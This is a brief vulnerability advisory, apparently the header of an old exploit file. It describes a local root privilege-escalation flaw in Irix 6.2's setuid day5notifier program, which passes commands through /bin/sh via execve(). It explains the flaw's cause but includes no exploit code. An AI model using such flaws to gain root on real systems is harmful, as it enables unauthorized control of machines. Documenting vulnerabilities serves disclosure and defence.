#A vulnerability exists in the day5notifier program, shipped with Irix 6.2 from Silicon Graphics Inc. This program will allow any user to run any command as root.
#
#day5notifier wisely replaces a number of system() calls with execve() calls. However, the code was translated to run a copy of /bin/sh as the processor in the execve. As such, all the security problems associated with using a system() call in a setuid program remain.
